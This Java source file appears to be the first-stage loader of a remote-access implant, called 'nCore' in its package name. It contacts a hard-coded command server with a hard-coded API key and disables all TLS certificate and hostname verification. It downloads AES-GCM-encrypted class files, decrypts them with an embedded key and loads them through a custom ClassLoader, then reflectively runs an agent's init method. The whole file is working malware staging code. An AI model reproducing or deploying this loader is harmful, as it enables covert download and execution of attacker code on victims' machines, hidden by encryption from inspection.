package com.nocebo.nCore;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileReader;
import java.io.StringWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.StringReader;
import java.lang.management.ManagementFactory;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.UUID;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;
import java.util.Base64;
import java.util.Arrays;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;

import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.*;
import javax.xml.transform.stream.StreamResult;

import java.net.UnknownHostException;
import java.nio.charset.StandardCharsets;
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;
import java.security.InvalidAlgorithmParameterException;
import java.security.KeyManagementException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import javax.crypto.IllegalBlockSizeException;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.net.URI;
import java.net.URISyntaxException;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.security.spec.AlgorithmParameterSpec;
import java.text.SimpleDateFormat;
import java.security.InvalidKeyException;
import java.util.List;
import java.awt.HeadlessException;
import java.awt.Toolkit;


class iAgentMain
{

    static public String urlData = "https://192.168.1.157/";
    static public String apiKey = "a18b25f2-6045-4aa2-b0b5-1dae01aa4f9a";
    static public String agentKey = "q8uf6,p2m1@31395aO+g+9592_4891lS";
    public static void main(String[] args) throws RemoteException, ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
    {
        //TimeUnit.MILLISECONDS.sleep(60*30*1000);

        System.out.println("attempting to start");

        Hashtable<String,byte[]> classData = downloadRequest(String.format("%s%s",urlData,"59009"));
        Enumeration<String> b = classData.keys();
        pkgLib packager = new pkgLib();
        Class iAgentClass = null;

        while (b.hasMoreElements())
        {
            String keyData = b.nextElement();
            System.out.println(keyData);
            Class newClass = packager.load(keyData,classData.get(keyData));
            if (keyData.equals("iAgent"))
            {
                iAgentClass = newClass;
            }
        }

        //Class iAgentClass = Class.forName("com.nocebo.nCore.iAgent");
        
        Method initMethod = iAgentClass.getMethod("init");
        initMethod.setAccessible(true);
        System.out.println(String.format("initializer:%s",initMethod.getName()));
        Object cObj = iAgentClass.newInstance();

        initMethod.invoke(cObj, new Object[]{});

    }

    private static class pkgLib extends ClassLoader {
        private Class load(String className, byte[] classical)
        {
            return defineClass(String.format("com.nocebo.nCore.%s",className), classical, 0, classical.length);
        }
    }


    private static Hashtable<String,byte[]> downloadRequest(String finalUrl) throws NoSuchAlgorithmException, KeyManagementException, IOException, URISyntaxException
    {
        //stackoverflow provided boilerplate
        SSLContext sslCon = SSLContext.getInstance("TLS");
        sslCon.init(null, new TrustManager[] {new InvalidCertificateTrustManager()}, null);

        URL ctrlUrl = new URI(finalUrl).toURL();

        HttpsURLConnection connMan;
        try
        {
            HttpsURLConnection.setDefaultSSLSocketFactory(sslCon.getSocketFactory());

            HostnameVerifier allHostsValid = new HostnameVerifier() {
                public boolean verify(String hostname, SSLSession session) {
                    return true;
                }
            };
            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);

            connMan = (HttpsURLConnection) ctrlUrl.openConnection();

            connMan.setRequestMethod("GET");
            connMan.setDoOutput(true);
            connMan.setRequestProperty(
                "Cookie",
                String.format(
                    "__Secure-YEC=%s",
                    new String(Base64.getUrlEncoder().encode(apiKey.getBytes())),
                    apiKey
                )
            );



            if (connMan.getResponseCode() == HttpsURLConnection.HTTP_OK)
            {
                //change this to process it to a arraylist
                String nonceData = connMan.getHeaderField("uuid").substring(0,12).replace("-","");
                BufferedReader connInReader = new BufferedReader(new InputStreamReader(connMan.getInputStream()));
                String responseData = connInReader.readLine();
                connInReader.close();
                Hashtable<String,byte[]> decodedResponseData = new Hashtable();
                
                if (!responseData.contains("error") && finalUrl.contains("59009"))
                {
                    decodedResponseData = decodeClasses(responseData, nonceData);
                }
                else if (!responseData.contains("error") && finalUrl.contains("59013"))
                {
                    decodedResponseData = decodeJar(responseData, nonceData);
                }
                else
                {
                    decodedResponseData.put("error",responseData.getBytes());
                }
                
                return decodedResponseData;

            }
            else
            {
                BufferedReader connInReader = new BufferedReader(new InputStreamReader(connMan.getInputStream()));
                String responseData = connInReader.readLine();
                connInReader.close();
                Hashtable<String,byte[]> hashedResponse =  new Hashtable();
                hashedResponse.put("error",responseData.getBytes());
                return hashedResponse;
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
            Hashtable<String,byte[]> hashedResponse =  new Hashtable();
            hashedResponse.put("error",e.getMessage().getBytes());
            return hashedResponse;
        }
    }

    public static Hashtable<String,byte[]> decodeClasses(String responseData, String nonceData) throws Exception, NoSuchAlgorithmException, KeyManagementException, IOException
    {
        Hashtable<String,byte[]> decodedResponseData = new Hashtable();
        String[] rDataSet = responseData.split("\\|");
                    
        for (int r=0;r<rDataSet.length;r++)
        {                

            String[] rData = rDataSet[r].split("\\.");
            String cNameData = new String(
                Base64.getDecoder().decode(
                    rData[0].getBytes()
                )
            );
            

            decodedResponseData.put(
                cNameData,
                decrypt(
                        Base64.getDecoder().decode(
                            rData[1].getBytes()
                        ),
                        agentKey.getBytes(),
                        nonceData.getBytes()
                    )        
                );     
        } 
        return decodedResponseData;                
                    
    }

    public static Hashtable<String,byte[]> decodeJar(String responseData, String nonceData) throws Exception, NoSuchAlgorithmException, KeyManagementException, IOException
    {
        Hashtable<String,byte[]> decodedResponseData = new Hashtable();

        decodedResponseData.put(
                "stub",
                decrypt(
                        Base64.getDecoder().decode(
                            responseData.getBytes()
                        ),
                        agentKey.getBytes(),
                        nonceData.getBytes()
                    )        
                );

        return decodedResponseData;   
    }

    //stackoverflow: https://stackoverflow.com/questions/26393031/how-to-execute-a-https-get-request-from-java
    public static class InvalidCertificateTrustManager implements X509TrustManager
    {
        @Override
        public X509Certificate[] getAcceptedIssuers() {
            return null;
        }

        @Override
        public void checkServerTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) throws CertificateException {

        }

        @Override
        public void checkClientTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) throws CertificateException {
        }    
    }

    public static byte[] encrypt(byte[] plaintext, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
    {
        SecretKey key = initKey(keyData);
        Cipher cipher = initCipher();

        AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
        cipher.init(Cipher.ENCRYPT_MODE, key, ivParam);
        return cipher.doFinal(plaintext);
    }

    public static byte[] decrypt(byte[] encrypted, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
    {
        SecretKey key = initKey(keyData);
        Cipher cipher = initCipher();

        AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
        cipher.init(Cipher.DECRYPT_MODE, key, ivParam);
        return cipher.doFinal(encrypted);
    }

    private static Cipher initCipher() throws Exception
    {
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        return cipher;
    }

    private static SecretKey initKey(byte[] keyBytes) throws Exception
    {
        SecretKey key = new SecretKeySpec(keyBytes, 0, keyBytes.length, "AES");
        return key;
    }    
}